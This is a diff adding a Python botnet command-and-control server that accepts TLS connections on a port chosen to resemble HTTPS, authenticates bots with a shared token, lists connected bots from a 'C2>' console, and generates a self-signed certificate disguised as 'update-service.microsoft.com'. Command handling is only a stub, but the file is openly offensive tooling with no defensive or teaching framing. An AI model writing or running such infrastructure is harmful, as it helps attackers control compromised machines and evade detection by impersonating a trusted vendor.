@@ -1,0 +1,96 @@
+import socket
+import ssl
+import threading
+import sys
+import os
+import datetime
+
+# CONFIGURATION
+HOST = '0.0.0.0'
+PORT = 4433  # Using a non-standard port to avoid root issues, but looks like HTTPS
+AUTH_TOKEN = "SUPER_SECRET_TOKEN_123"  # The bot must provide this
+CERT_FILE = "c2_cert.pem"
+KEY_FILE = "c2_key.pem"
+
+connected_bots = []
+
+def generate_cert():
+    """Generates a self-signed certificate for TLS encryption."""
+    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
+        print("[*] Generating self-signed SSL certificate...")
+        os.system(f"openssl req -x509 -newkey rsa:4096 -keyout {KEY_FILE} -out {CERT_FILE} -days 365 -nodes -subj '/CN=update-service.microsoft.com'")
+        print("[+] Certificate generated.")
+
+def handle_client(conn, addr):
+    print(f"[!] New connection from {addr}. Waiting for authentication...")
+    try:
+        # Set a timeout for authentication
+        conn.settimeout(5.0)
+        
+        # Receive initial handshake/auth token
+        data = conn.recv(1024).decode('utf-8').strip()
+        
+        if data != AUTH_TOKEN:
+            print(f"[-] Authentication failed for {addr}. Closing connection.")
+            conn.close()
+            return
+        
+        print(f"[+] Bot authenticated: {addr}")
+        conn.settimeout(None) # Remove timeout for stable connection
+        connected_bots.append(conn)
+        
+        # Keep connection alive
+        while True:
+            data = conn.recv(1024)
+            if not data:
+                break
+            # Process commands here if implemented
+    except Exception as e:
+        print(f"[!] Error with {addr}: {e}")
+    finally:
+        if conn in connected_bots:
+            connected_bots.remove(conn)
+        conn.close()
+        print(f"[-] Connection closed: {addr}")
+
+def command_interface():
+    print("\n--- SECURE C2 SERVER ACTIVE (TLS ENCRYPTED) ---")
+    print(f"Listening on port {PORT}")
+    print("Commands: 'list', 'exit'")
+    while True:
+        cmd = input("C2> ")
+        if cmd == "list":
+            print(f"Active Bots: {len(connected_bots)}")
+            for i, bot in enumerate(connected_bots):
+                print(f" {i}. Encrypted Connection: {bot}")
+        elif cmd == "exit":
+            print("Shutting down server.")
+            sys.exit(0)
+        else:
+            print("Command not recognized.")
+
+def start_server():
+    generate_cert()
+    
+    # Create SSL Context
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(CERT_FILE, KEY_FILE)
+    
+    # Bind socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((HOST, PORT))
+    sock.listen(5)
+    
+    print(f"[*] Secure C2 Server started on {HOST}:{PORT}")
+    
+    threading.Thread(target=command_interface, daemon=True).start()
+    
+    while True:
+        conn, addr = sock.accept()
+        # Wrap socket in SSL
+        ssl_conn = context.wrap_socket(conn, server_side=True)
+        threading.Thread(target=handle_client, args=(ssl_conn, addr), daemon=True).start()
+
+if __name__ == "__main__":
+    start_server()
